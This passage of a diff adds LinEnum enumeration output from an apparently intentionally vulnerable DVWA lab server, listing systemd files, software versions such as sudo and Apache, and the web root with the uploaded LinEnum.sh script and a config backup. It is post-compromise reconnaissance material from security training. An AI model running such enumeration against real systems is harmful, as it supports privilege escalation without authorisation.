+-rwxr-xr-x 1 root root 4.9K Mar 22  2021 cloud-init-generator
+-rwxr-xr-x 1 root root  286 Jun 21  2019 friendly-recovery
+
+/lib/systemd/system-preset:
+total 8.0K
+-rw-r--r-- 1 root root   30 Mar 24  2021 fwupd-refresh.preset
+-rw-r--r-- 1 root root 1.3K Feb  2  2021 90-systemd.preset
+
+/lib/systemd/ntp-units.d:
+total 4.0K
+-rw-r--r-- 1 root root 26 Feb  2  2021 80-systemd-timesync.list
+
+/lib/systemd/logind.conf.d:
+total 4.0K
+-rw-r--r-- 1 root root 38 Feb 19  2021 unattended-upgrades-logind-maxdelay.conf
+
+/lib/systemd/system-sleep:
+total 8.0K
+-rwxr-xr-x 1 root root 219 Feb 19  2021 unattended-upgrades
+-rwxr-xr-x 1 root root  92 Dec 15  2020 hdparm
+
+/lib/systemd/system-environment-generators:
+total 16K
+-rwxr-xr-x 1 root root 15K Mar 30  2021 snapd-env-generator
+
+/lib/systemd/system-shutdown:
+total 8.0K
+-rwxr-xr-x 1 root root 251 Mar 26  2021 fwupd.shutdown
+-rwxr-xr-x 1 root root 160 Feb 25  2021 mdadm.shutdown
+
+/lib/systemd/boot:
+total 4.0K
+drwxr-xr-x 2 root root 4.0K Nov  9 03:15 efi
+
+/lib/systemd/boot/efi:
+total 152K
+-rwxr-xr-x 1 root root 57K Jul 20 11:38 linuxx64.efi.stub
+-rwxr-xr-x 1 root root 92K Jul 20 11:38 systemd-bootx64.efi
+
+
+[00;33m### SOFTWARE #############################################[00m
+[00;31m[-] Sudo version:[00m
+Sudo version 1.9.5p2
+
+
+[00;31m[-] MYSQL version:[00m
+mysql  Ver 15.1 Distrib 10.5.12-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper
+
+
+[00;31m[-] Apache version:[00m
+Server version: Apache/2.4.46 (Ubuntu)
+Server built:   2021-09-28T10:57:42
+
+
+[00;31m[-] Apache user configuration:[00m
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+
+
+[00;31m[-] Installed Apache modules:[00m
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ watchdog_module (static)
+ http_module (static)
+ log_config_module (static)
+ logio_module (static)
+ version_module (static)
+ unixd_module (static)
+ access_compat_module (shared)
+ alias_module (shared)
+ auth_basic_module (shared)
+ authn_core_module (shared)
+ authn_file_module (shared)
+ authz_core_module (shared)
+ authz_host_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ env_module (shared)
+ filter_module (shared)
+ mime_module (shared)
+ mpm_prefork_module (shared)
+ negotiation_module (shared)
+ php7_module (shared)
+ reqtimeout_module (shared)
+ setenvif_module (shared)
+ status_module (shared)
+
+
+[00;31m[-] www home dir contents:[00m
+/var/www/:
+total 12K
+drwxr-xr-x  3 root     root     4.0K Nov  9 03:21 .
+drwxr-xr-x 14 root     root     4.0K Nov  9 03:21 ..
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 html
+
+/var/www/html:
+total 804K
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 .
+drwxr-xr-x  3 root     root     4.0K Nov  9 03:21 ..
+-rw-rw-r--  1 www-data www-data 3.4K Nov  9 03:25 about.php
+-rw-rw-r--  1 www-data www-data 7.2K Nov  9 03:25 CHANGELOG.md
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 04:55 config
+-rw-rw-r--  1 www-data www-data  33K Nov  9 03:25 COPYING.txt
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 database
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 docs
+drwxrwxr-x  6 www-data www-data 4.0K Nov  9 03:25 dvwa
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 external
+-rw-rw-r--  1 www-data www-data 1.4K Nov  9 03:25 favicon.ico
+drwxrwxr-x  8 www-data www-data 4.0K Nov  9 03:25 .git
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 .github
+-rw-rw-r--  1 www-data www-data  229 Nov  9 03:25 .gitignore
+drwxrwxr-x  5 www-data www-data 4.0K Nov  9 03:25 hackable
+-rw-rw-r--  1 www-data www-data  500 Nov  9 03:25 .htaccess
+-rw-rw-r--  1 www-data www-data  895 Nov  9 03:25 ids_log.php
+-rw-rw-r--  1 www-data www-data 4.1K Nov  9 03:25 index.php
+-rw-rw-r--  1 www-data www-data 2.2K Nov  9 03:25 instructions.php
+----------  1 www-data www-data 606K Nov 17 07:32 LinEnum.sh
+-rw-rw-r--  1 www-data www-data 4.1K Nov  9 03:25 login.php
+-rw-rw-r--  1 www-data www-data  414 Nov  9 03:25 logout.php
+-rw-rw-r--  1 www-data www-data  199 Nov  9 03:25 phpinfo.php
+-rw-rw-r--  1 www-data www-data  154 Nov  9 03:25 php.ini
+-rw-rw-r--  1 www-data www-data  17K Nov  9 03:25 README.md
+-rw-rw-r--  1 www-data www-data  16K Nov  9 03:25 README.zh.md
+-rw-rw-r--  1 www-data www-data   26 Nov  9 03:25 robots.txt
+-rw-rw-r--  1 www-data www-data 4.7K Nov  9 03:25 security.php
+-rw-rw-r--  1 www-data www-data 3.3K Nov  9 03:25 setup.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 tests
+drwxrwxr-x 16 www-data www-data 4.0K Nov 17 07:39 vulnerabilities
+
+/var/www/html/config:
+total 20K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 04:55 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+-rw-rw-r--  1 www-data www-data 2.4K Nov  9 04:50 config.inc.php
+-rw-r--r--  1 www-data www-data 2.4K Nov  9 04:55 config.inc.php.bak
+-rw-rw-r--  1 www-data www-data 2.4K Nov  9 03:25 config.inc.php.dist
+
+/var/www/html/database:
+total 60K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+-rw-rw-r--  1 www-data www-data 1.1K Nov  9 03:25 create_mssql_db.sql
+-rw-rw-r--  1 www-data www-data 1.1K Nov  9 03:25 create_oracle_db.sql
+-rw-rw-r--  1 www-data www-data  945 Nov  9 03:25 create_sqlite_db.sql
+-rw-rw-r--  1 www-data www-data  20K Nov  9 03:25 sqli.db
+-rw-rw-r--  1 www-data www-data  20K Nov  9 03:25 sqli.db.dist
+
+/var/www/html/docs:
+total 428K
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+-rw-rw-r--  1 www-data www-data 413K Nov  9 03:25 DVWA_v1.3.pdf
+-rw-rw-r--  1 www-data www-data  105 Nov  9 03:25 pdf.html
+
+/var/www/html/dvwa:
+total 24K
+drwxrwxr-x  6 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 css
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 images
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 includes
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 js
+
+/var/www/html/dvwa/css:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 6 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  304 Nov  9 03:25 help.css
+-rw-rw-r-- 1 www-data www-data  842 Nov  9 03:25 login.css
+-rw-rw-r-- 1 www-data www-data 4.0K Nov  9 03:25 main.css
+-rw-rw-r-- 1 www-data www-data  319 Nov  9 03:25 source.css
+
+/var/www/html/dvwa/images:
+total 52K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 6 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  299 Nov  9 03:25 dollar.png
+-rw-rw-r-- 1 www-data www-data  761 Nov  9 03:25 lock.png
+-rw-rw-r-- 1 www-data www-data 8.9K Nov  9 03:25 login_logo.png
+-rw-rw-r-- 1 www-data www-data 5.0K Nov  9 03:25 logo.png
+-rw-rw-r-- 1 www-data www-data 4.5K Nov  9 03:25 RandomStorm.png
+-rw-rw-r-- 1 www-data www-data  464 Nov  9 03:25 spanner.png
+-rw-rw-r-- 1 www-data www-data  423 Nov  9 03:25 warning.png
+
+/var/www/html/dvwa/includes:
+total 92K
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 6 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 DBMS
+-rw-rw-r-- 1 www-data www-data  21K Nov  9 03:25 dvwaPage.inc.php
+-rw-rw-r-- 1 www-data www-data 2.8K Nov  9 03:25 dvwaPhpIds.inc.php
+-rw-rw-r-- 1 www-data www-data  51K Nov  9 03:25 Parsedown.php
+
+/var/www/html/dvwa/includes/DBMS:
+total 20K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 5.0K Nov  9 03:25 MySQL.php
+-rw-rw-r-- 1 www-data www-data 3.5K Nov  9 03:25 PGSQL.php
+
+/var/www/html/dvwa/js:
+total 16K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 6 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  593 Nov  9 03:25 add_event_listeners.js
+-rw-rw-r-- 1 www-data www-data 1.1K Nov  9 03:25 dvwaPage.js
+
+/var/www/html/external:
+total 16K
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 12 www-data www-data 4.0K Nov 17 07:32 ..
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 phpids
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 recaptcha
+
+/var/www/html/external/phpids:
+total 12K
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 0.6
+
+/var/www/html/external/phpids/0.6:
+total 32K
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  380 Nov  9 03:25 build.xml
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 docs
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 lib
+-rw-rw-r-- 1 www-data www-data 7.5K Nov  9 03:25 LICENSE
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 tests
+
+/var/www/html/external/phpids/0.6/docs:
+total 16K
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 examples
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 phpdocumentor
+
+/var/www/html/external/phpids/0.6/docs/examples:
+total 16K
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 cakephp
+-rw-rw-r-- 1 www-data www-data 3.6K Nov  9 03:25 example.php
+
+/var/www/html/external/phpids/0.6/docs/examples/cakephp:
+total 24K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 7.8K Nov  9 03:25 ids.php
+-rw-rw-r-- 1 www-data www-data  653 Nov  9 03:25 intrusion.php
+-rw-rw-r-- 1 www-data www-data  645 Nov  9 03:25 README
+
+/var/www/html/external/phpids/0.6/docs/phpdocumentor:
+total 764K
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  416 Nov  9 03:25 blank.html
+-rw-rw-r-- 1 www-data www-data 2.7K Nov  9 03:25 classtrees_PHPIDS.html
+-rw-rw-r-- 1 www-data www-data 555K Nov  9 03:25 elementindex.html
+-rw-rw-r-- 1 www-data www-data  59K Nov  9 03:25 elementindex_PHPIDS.html
+-rw-rw-r-- 1 www-data www-data 108K Nov  9 03:25 errors.html
+-rw-rw-r-- 1 www-data www-data  951 Nov  9 03:25 index.html
+-rw-rw-r-- 1 www-data www-data 4.9K Nov  9 03:25 li_PHPIDS.html
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 media
+-rw-rw-r-- 1 www-data www-data  994 Nov  9 03:25 packages.html
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 PHPIDS
+
+/var/www/html/external/phpids/0.6/docs/phpdocumentor/media:
+total 20K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  393 Nov  9 03:25 banner.css
+-rw-rw-r-- 1 www-data www-data 5.3K Nov  9 03:25 stylesheet.css
+
+/var/www/html/external/phpids/0.6/docs/phpdocumentor/PHPIDS:
+total 384K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 4 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 5.4K Nov  9 03:25 _Caching---Database.php.html
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 _Caching---Factory.php.html
+-rw-rw-r-- 1 www-data www-data 5.4K Nov  9 03:25 _Caching---File.php.html
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 _Caching---Interface.php.html
+-rw-rw-r-- 1 www-data www-data 5.4K Nov  9 03:25 _Caching---Memcached.php.html
+-rw-rw-r-- 1 www-data www-data 5.4K Nov  9 03:25 _Caching---Session.php.html
+-rw-rw-r-- 1 www-data www-data 3.3K Nov  9 03:25 _Converter.php.html
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 _Event.php.html
+-rw-rw-r-- 1 www-data www-data 2.4K Nov  9 03:25 _Filter---Filter.php.html
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 _Filter.php.html
+-rw-rw-r-- 1 www-data www-data 2.5K Nov  9 03:25 _Filter---Storage---Abstract.php.html
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 _Filter---Storage.php.html
+-rw-rw-r-- 1 www-data www-data 8.9K Nov  9 03:25 IDS_Caching_Database.html
+-rw-rw-r-- 1 www-data www-data 8.8K Nov  9 03:25 IDS_Caching_File.html
+-rw-rw-r-- 1 www-data www-data 4.6K Nov  9 03:25 IDS_Caching.html
+-rw-rw-r-- 1 www-data www-data 4.8K Nov  9 03:25 IDS_Caching_Interface.html
+-rw-rw-r-- 1 www-data www-data 8.9K Nov  9 03:25 IDS_Caching_Memcached.html
+-rw-rw-r-- 1 www-data www-data 8.7K Nov  9 03:25 IDS_Caching_Session.html
+-rw-rw-r-- 1 www-data www-data  27K Nov  9 03:25 IDS_Converter.html
+-rw-rw-r-- 1 www-data www-data  16K Nov  9 03:25 IDS_Event.html
+-rw-rw-r-- 1 www-data www-data  15K Nov  9 03:25 IDS_Filter.html
+-rw-rw-r-- 1 www-data www-data  11K Nov  9 03:25 IDS_Filter_Storage_Abstract.html
+-rw-rw-r-- 1 www-data www-data  14K Nov  9 03:25 IDS_Filter_Storage.html
+-rw-rw-r-- 1 www-data www-data  15K Nov  9 03:25 IDS_Init.html
+-rw-rw-r-- 1 www-data www-data 8.2K Nov  9 03:25 IDS_Log_Composite.html
+-rw-rw-r-- 1 www-data www-data 7.3K Nov  9 03:25 IDS_Log_Database.html
+-rw-rw-r-- 1 www-data www-data  12K Nov  9 03:25 IDS_Log_Email.html
+-rw-rw-r-- 1 www-data www-data 8.5K Nov  9 03:25 IDS_Log_File.html
+-rw-rw-r-- 1 www-data www-data 4.2K Nov  9 03:25 IDS_Log_Interface.html
+-rw-rw-r-- 1 www-data www-data  18K Nov  9 03:25 IDS_Monitor.html
+-rw-rw-r-- 1 www-data www-data  21K Nov  9 03:25 IDS_Report.html
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 _Init.php.html
+-rw-rw-r-- 1 www-data www-data 5.4K Nov  9 03:25 _Log---Composite.php.html
+-rw-rw-r-- 1 www-data www-data 5.4K Nov  9 03:25 _Log---Database.php.html
+-rw-rw-r-- 1 www-data www-data 5.4K Nov  9 03:25 _Log---Email.php.html
+-rw-rw-r-- 1 www-data www-data 5.4K Nov  9 03:25 _Log---File.php.html
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 _Log---Interface.php.html
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 _Monitor.php.html
+-rw-rw-r-- 1 www-data www-data 3.2K Nov  9 03:25 _Report.php.html
+
+/var/www/html/external/phpids/0.6/lib:
+total 12K
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 5 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 IDS
+
+/var/www/html/external/phpids/0.6/lib/IDS:
+total 160K
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 Caching
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 Config
+-rw-rw-r-- 1 www-data www-data  22K Nov  9 03:25 Converter.php
+-rw-rw-r-- 1 www-data www-data  16K Nov  9 03:25 default_filter.json
+-rw-rw-r-- 1 www-data www-data  30K Nov  9 03:25 default_filter.xml
+-rw-rw-r-- 1 www-data www-data 5.4K Nov  9 03:25 Event.php
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 Filter
+-rw-rw-r-- 1 www-data www-data 4.3K Nov  9 03:25 Filter.php
+-rw-rw-r-- 1 www-data www-data 6.3K Nov  9 03:25 Init.php
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 Log
+-rw-rw-r-- 1 www-data www-data  19K Nov  9 03:25 Monitor.php
+-rw-rw-r-- 1 www-data www-data 8.9K Nov  9 03:25 Report.php
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 tmp
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 vendors
+
+/var/www/html/external/phpids/0.6/lib/IDS/Caching:
+total 44K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 7.1K Nov  9 03:25 Database.php
+-rw-rw-r-- 1 www-data www-data 2.5K Nov  9 03:25 Factory.php
+-rw-rw-r-- 1 www-data www-data 4.7K Nov  9 03:25 File.php
+-rw-rw-r-- 1 www-data www-data 2.0K Nov  9 03:25 Interface.php
+-rw-rw-r-- 1 www-data www-data 5.8K Nov  9 03:25 Memcached.php
+-rw-rw-r-- 1 www-data www-data 3.5K Nov  9 03:25 Session.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/Config:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 2.8K Nov  9 03:25 Config.ini
+
+/var/www/html/external/phpids/0.6/lib/IDS/Filter:
+total 20K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  11K Nov  9 03:25 Storage.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/Log:
+total 44K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data 3.6K Nov  9 03:25 Composite.php
+-rw-rw-r-- 1 www-data www-data 7.5K Nov  9 03:25 Database.php
+-rw-rw-r-- 1 www-data www-data  11K Nov  9 03:25 Email.php
+-rw-rw-r-- 1 www-data www-data 6.2K Nov  9 03:25 File.php
+-rw-rw-r-- 1 www-data www-data 1.8K Nov  9 03:25 Interface.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/tmp:
+total 12K
+drwxrwxr-x 2 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r-- 1 www-data www-data  319 Nov  9 03:25 phpids_log.txt
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors:
+total 12K
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 8 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 3 www-data www-data 4.0K Nov  9 03:25 htmlpurifier
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier:
+total 68K
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 HTMLPurifier
+-rw-rw-r--  1 www-data www-data  625 Nov  9 03:25 HTMLPurifier.autoload.php
+-rw-rw-r--  1 www-data www-data  260 Nov  9 03:25 HTMLPurifier.auto.php
+-rw-rw-r--  1 www-data www-data  545 Nov  9 03:25 HTMLPurifier.func.php
+-rw-rw-r--  1 www-data www-data 9.1K Nov  9 03:25 HTMLPurifier.includes.php
+-rw-rw-r--  1 www-data www-data  969 Nov  9 03:25 HTMLPurifier.kses.php
+-rw-rw-r--  1 www-data www-data  221 Nov  9 03:25 HTMLPurifier.path.php
+-rw-rw-r--  1 www-data www-data 9.0K Nov  9 03:25 HTMLPurifier.php
+-rw-rw-r--  1 www-data www-data  12K Nov  9 03:25 HTMLPurifier.safe-includes.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier:
+total 456K
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 ..
+-rw-rw-r--  1 www-data www-data 4.5K Nov  9 03:25 AttrCollections.php
+drwxrwxr-x  5 www-data www-data 4.0K Nov  9 03:25 AttrDef
+-rw-rw-r--  1 www-data www-data 3.3K Nov  9 03:25 AttrDef.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 AttrTransform
+-rw-rw-r--  1 www-data www-data 1.9K Nov  9 03:25 AttrTransform.php
+-rw-rw-r--  1 www-data www-data 2.8K Nov  9 03:25 AttrTypes.php
+-rw-rw-r--  1 www-data www-data 6.7K Nov  9 03:25 AttrValidator.php
+-rw-rw-r--  1 www-data www-data 3.7K Nov  9 03:25 Bootstrap.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 ChildDef
+-rw-rw-r--  1 www-data www-data 1.5K Nov  9 03:25 ChildDef.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 ConfigDef
+-rw-rw-r--  1 www-data www-data  133 Nov  9 03:25 ConfigDef.php
+-rw-rw-r--  1 www-data www-data  19K Nov  9 03:25 Config.php
+drwxrwxr-x  5 www-data www-data 4.0K Nov  9 03:25 ConfigSchema
+-rw-rw-r--  1 www-data www-data 8.6K Nov  9 03:25 ConfigSchema.php
+-rw-rw-r--  1 www-data www-data 5.4K Nov  9 03:25 ContentSets.php
+-rw-rw-r--  1 www-data www-data 2.5K Nov  9 03:25 Context.php
+-rw-rw-r--  1 www-data www-data  13K Nov  9 03:25 CSSDefinition.php
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 DefinitionCache
+-rw-rw-r--  1 www-data www-data 2.9K Nov  9 03:25 DefinitionCacheFactory.php
+-rw-rw-r--  1 www-data www-data 3.4K Nov  9 03:25 DefinitionCache.php
+-rw-rw-r--  1 www-data www-data  851 Nov  9 03:25 Definition.php
+-rw-rw-r--  1 www-data www-data 1.5K Nov  9 03:25 Doctype.php
+-rw-rw-r--  1 www-data www-data 3.6K Nov  9 03:25 DoctypeRegistry.php
+-rw-rw-r--  1 www-data www-data 5.7K Nov  9 03:25 ElementDef.php
+-rw-rw-r--  1 www-data www-data  19K Nov  9 03:25 Encoder.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 EntityLookup
+-rw-rw-r--  1 www-data www-data 1.3K Nov  9 03:25 EntityLookup.php
+-rw-rw-r--  1 www-data www-data 4.9K Nov  9 03:25 EntityParser.php
+-rw-rw-r--  1 www-data www-data 7.6K Nov  9 03:25 ErrorCollector.php
+-rw-rw-r--  1 www-data www-data 1.7K Nov  9 03:25 ErrorStruct.php
+-rw-rw-r--  1 www-data www-data  170 Nov  9 03:25 Exception.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Filter
+-rw-rw-r--  1 www-data www-data 1.4K Nov  9 03:25 Filter.php
+-rw-rw-r--  1 www-data www-data 6.8K Nov  9 03:25 Generator.php
+-rw-rw-r--  1 www-data www-data  17K Nov  9 03:25 HTMLDefinition.php
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 HTMLModule
+-rw-rw-r--  1 www-data www-data  15K Nov  9 03:25 HTMLModuleManager.php
+-rw-rw-r--  1 www-data www-data 9.6K Nov  9 03:25 HTMLModule.php
+-rw-rw-r--  1 www-data www-data 1.6K Nov  9 03:25 IDAccumulator.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Injector
+-rw-rw-r--  1 www-data www-data 8.5K Nov  9 03:25 Injector.php
+drwxrwxr-x  4 www-data www-data 4.0K Nov  9 03:25 Language
+-rw-rw-r--  1 www-data www-data 6.7K Nov  9 03:25 LanguageFactory.php
+-rw-rw-r--  1 www-data www-data 5.5K Nov  9 03:25 Language.php
+-rw-rw-r--  1 www-data www-data 3.3K Nov  9 03:25 Length.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Lexer
+-rw-rw-r--  1 www-data www-data  11K Nov  9 03:25 Lexer.php
+-rw-rw-r--  1 www-data www-data 3.4K Nov  9 03:25 PercentEncoder.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Printer
+-rw-rw-r--  1 www-data www-data 5.0K Nov  9 03:25 Printer.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Strategy
+-rw-rw-r--  1 www-data www-data  695 Nov  9 03:25 Strategy.php
+-rw-rw-r--  1 www-data www-data 3.2K Nov  9 03:25 StringHashParser.php
+-rw-rw-r--  1 www-data www-data 1001 Nov  9 03:25 StringHash.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 TagTransform
+-rw-rw-r--  1 www-data www-data 1.1K Nov  9 03:25 TagTransform.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 Token
+-rw-rw-r--  1 www-data www-data 2.8K Nov  9 03:25 TokenFactory.php
+-rw-rw-r--  1 www-data www-data 1.6K Nov  9 03:25 Token.php
+-rw-rw-r--  1 www-data www-data 9.5K Nov  9 03:25 UnitConverter.php
+-rw-rw-r--  1 www-data www-data 3.0K Nov  9 03:25 URIDefinition.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 URIFilter
+-rw-rw-r--  1 www-data www-data 1.4K Nov  9 03:25 URIFilter.php
+-rw-rw-r--  1 www-data www-data 2.4K Nov  9 03:25 URIParser.php
+-rw-rw-r--  1 www-data www-data 6.6K Nov  9 03:25 URI.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 URIScheme
+-rw-rw-r--  1 www-data www-data 1.2K Nov  9 03:25 URIScheme.php
+-rw-rw-r--  1 www-data www-data 2.3K Nov  9 03:25 URISchemeRegistry.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 VarParser
+-rw-rw-r--  1 www-data www-data  147 Nov  9 03:25 VarParserException.php
+-rw-rw-r--  1 www-data www-data 5.3K Nov  9 03:25 VarParser.php
+
+/var/www/html/external/phpids/0.6/lib/IDS/vendors/htmlpurifier/HTMLPurifier/AttrDef:
+total 48K
+drwxrwxr-x  5 www-data www-data 4.0K Nov  9 03:25 .
+drwxrwxr-x 21 www-data www-data 4.0K Nov  9 03:25 ..
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 CSS
+-rw-rw-r--  1 www-data www-data 3.2K Nov  9 03:25 CSS.php
+-rw-rw-r--  1 www-data www-data 2.1K Nov  9 03:25 Enum.php
+drwxrwxr-x  2 www-data www-data 4.0K Nov  9 03:25 HTML
+-rw-rw-r--  1 www-data www-data 2.4K Nov  9 03:25 Integer.php
+-rw-rw-r--  1 www-data www-data 2.3K Nov  9 03:25 Lang.php
+-rw-rw-r--  1 www-data www-data  997 Nov  9 03:25 Switch.php
+-rw-rw-r--  1 www-data www-data  269 Nov  9 03:25 Text.php
+drwxrwxr-x  3 www-data www-data 4.0K Nov  9 03:25 URI
+-rw-rw-r--  1 www-data www-data 2.3K Nov  9 03:25 URI.php
+
